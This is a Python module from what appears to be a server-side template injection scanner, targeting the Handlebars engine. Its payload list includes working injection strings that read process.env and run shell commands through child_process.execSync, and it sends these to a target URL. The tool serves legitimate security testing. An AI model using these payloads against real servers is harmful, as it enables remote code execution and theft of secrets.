"""
Handlebars template engine detection module.

This module implements Server-Side Template Injection (SSTI) detection
for the Handlebars template engine, commonly used in Node.js applications.

Author: SSTI Scanner Team
License: MIT
"""

import re
import urllib.parse
from typing import List, Dict, Any, Optional

from .base import BaseTemplateEngine, EngineResult, ConfidenceLevel, Payload


class HandlebarsEngine(BaseTemplateEngine):
    """
    Handlebars template engine detector.
    
    Handlebars is a JavaScript-based template engine.
    It uses {{}} for expressions and {{#}} for helpers.
    """
    
    def __init__(self, config):
        super().__init__(config)
        self.name = "handlebars"
        self.description = "Handlebars template engine (Node.js)"
        self.payloads = self._load_payloads()
        
        # Handlebars-specific patterns
        self.detection_patterns = {
            'math_result': [r'\b49\b', r'\b64\b', r'\b121\b'],
            'object_disclosure': [r'function.*?\(', r'constructor', r'prototype', r'__proto__'],
            'helper_execution': [r'#each', r'#if', r'#with', r'#unless'],
            'js_execution': [r'require\(', r'process\.', r'global\.', r'Buffer\.'],
        }
    
    def _load_payloads(self) -> List[Payload]:
        """Load Handlebars-specific SSTI payloads."""
        payloads = []
        
        # Basic math and expression payloads
        basic_payloads = [
            "{{7*7}}", "{{8*8}}", "{{11*11}}", "{{this}}", "{{constructor}}", 
            "{{constructor.constructor}}", "{{constructor.constructor('return 7*7')()}}",
            "{{constructor.constructor('return process.env')()}}",
            "{{constructor.constructor('return global.process.mainModule.require')()}}",
            "{{constructor.constructor('return global.process.mainModule.require(\"child_process\").execSync(\"id\")')()}}",
        ]
        
        # Helper-based payloads
        helper_payloads = [
            "{{#with this}}{{constructor.constructor('return 7*7')()}}{{/with}}",
            "{{#each constructor}}{{@key}}{{/each}}",
            "{{lookup constructor 'constructor'}}",
            "{{lookup (lookup this 'constructor') 'constructor'}}",
        ]
        
        # URL-encoded variants
        url_payloads = ["%7B%7B7%2A7%7D%7D", "%7B%7Bthis%7D%7D"]
        
        all_payload_strings = basic_payloads + helper_payloads + url_payloads
        
        for i, payload_str in enumerate(all_payload_strings):
            context = "url" if payload_str.startswith('%') else "html"
            payload_type = "helper" if "#with" in payload_str or "#each" in payload_str else "math" if "*" in payload_str else "object_access"
            
            payloads.append(Payload(
                payload=payload_str,
                type=payload_type,
                context=context,
                description=f"Handlebars {payload_type} payload"
            ))
        
        return payloads
    
    async def test_payload(self, url: str, payload: str, **kwargs) -> EngineResult:
        """Test payload against target URL."""
        http_client = kwargs.get('http_client')
        method = kwargs.get('method', 'GET')
        data = kwargs.get('data', {})
        headers = kwargs.get('headers', {})
        
        if not http_client:
            return EngineResult(False, ConfidenceLevel.LOW, payload, "", "No HTTP client", self.name)
        
        try:
            if method.upper() == 'GET':
                test_url = f"{url}?test={payload}" if '?' not in url else url.replace('INJECT', payload)
                response = await http_client.get(test_url, headers=headers)
            else:
                test_data = data.copy() if data else {}
                test_data['test'] = payload
                response = await http_client.post(url, data=test_data, headers=headers)
            
            return self.analyze_response("", payload, response.get('text', ''))
            
        except Exception as e:
            return EngineResult(False, ConfidenceLevel.LOW, payload, "", f"Request failed: {e}", self.name)
    
    def analyze_response(self, original_response: str, payload: str, response: str) -> EngineResult:
        """Analyze response for Handlebars SSTI indicators."""
        if not response:
            return EngineResult(False, ConfidenceLevel.LOW, payload, response, "Empty response", self.name)
        
        evidence_parts = []
        confidence = ConfidenceLevel.LOW
        is_vulnerable = False
        
        # Check for math results
        if any(p in payload for p in ['7*7', '8*8', '11*11']):
            for pattern in self.detection_patterns['math_result']:
                if re.search(pattern, response):
                    evidence_parts.append(f"Math operation executed: {pattern}")
                    confidence = ConfidenceLevel.HIGH
                    is_vulnerable = True
        
        # Check for object disclosure
        for pattern in self.detection_patterns['object_disclosure']:
            if re.search(pattern, response, re.IGNORECASE):
                evidence_parts.append(f"Object disclosure: {pattern}")
                confidence = max(confidence, ConfidenceLevel.MEDIUM)
                is_vulnerable = True
        
        # Check for JavaScript execution indicators
        js_indicators = ['require(', 'process.', 'global.', 'Buffer.', 'child_process', 'execSync', 'uid=', 'gid=']
        for indicator in js_indicators:
            if indicator in response:
                evidence_parts.append(f"JavaScript execution: {indicator}")
                confidence = ConfidenceLevel.HIGH
                is_vulnerable = True
        
        # Handlebars errors
        handlebars_errors = ['Handlebars:', 'Missing helper', 'Parse error', 'Invalid path']
        for error in handlebars_errors:
            if error in response:
                evidence_parts.append(f"Handlebars error: {error}")
                confidence = max(confidence, ConfidenceLevel.MEDIUM)
                is_vulnerable = True
        
        evidence = "Handlebars SSTI detected: " + "; ".join(evidence_parts) if evidence_parts else "No Handlebars SSTI indicators"
        return EngineResult(is_vulnerable, confidence, payload, response[:500], evidence, self.name)
    
    def get_payloads_for_context(self, context: str) -> List[Payload]:
        return [p for p in self.payloads if p.context == context]
    
    def get_payloads_by_type(self, payload_type: str) -> List[Payload]:
        return [p for p in self.payloads if p.type == payload_type]
    
    def encode_payload(self, payload: str, context: str) -> str:
        if context == "url":
            return urllib.parse.quote(payload)
        elif context == "html":
            return payload.replace('<', '&lt;').replace('>', '&gt;')
        return payload
    
    def get_info(self) -> Dict[str, Any]:
        return {
            'name': self.name, 'description': self.description, 'payloads': len(self.payloads),
            'contexts': list(set(p.context for p in self.payloads)),
            'types': list(set(p.type for p in self.payloads)),
            'framework': 'Handlebars', 'language': 'JavaScript', 'syntax': '{{expression}}'
        }
